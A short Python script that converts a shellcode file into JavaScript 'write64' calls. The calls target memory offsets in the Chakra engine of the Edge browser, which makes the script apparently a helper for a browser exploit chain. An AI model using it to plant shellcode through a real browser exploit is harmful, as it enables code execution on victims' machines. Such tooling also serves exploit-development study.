def GetByte(reverse_byte, index):
	if (index < len(reverse_byte)):
		firstHex = hex(reverse_byte[index])
		firstHex = firstHex.replace("0x","")

		if (len(firstHex) == 1):
			firstHex = '0' + firstHex
	else:
		firstHex = "00"

	return firstHex


shellcode = ""
with open("edge_shellcode.txt", "rb") as file:
	byte = file.read(8)

	while byte:
		reverse_byte = byte[::-1]
		firstHex = ""
		secHex = ""
		#for index in range(1,len(reverse_byte),8):

		firstHex += GetByte(reverse_byte, 4)
		firstHex += GetByte(reverse_byte, 5)
		firstHex += GetByte(reverse_byte, 6)
		firstHex += GetByte(reverse_byte, 7)

		secHex += GetByte(reverse_byte, 0)
		secHex += GetByte(reverse_byte, 1)
		secHex += GetByte(reverse_byte, 2)
		secHex += GetByte(reverse_byte, 3)

#		if (len(firstHex) < 8):
#			fill = 8 - len(firstHex)
#			firstHex += "0" * fill
#
#		if (len(secHex) < 8):
#			fill = 8 - len(secHex)
#			secHex += "0" * fill
#
		print(f"write64(chakraLo+0x74b000+countMe, chakraHigh, 0x{firstHex}, 0x{secHex});")
		print(f"inc();")


#			if (index+3 < len(reverse_byte)):
#				firstHex = hex(reverse_byte[index+3])
#				print(f'{firstHex}')
#			else:
#				firstHex += "00"
#			if (hexIndex+2 < len(reverse_byte)):
#				firstHex += hex(reverse_byte[hexIndex+2])
#			else:
#				firstHex += "00"

		byte = file.read(8)


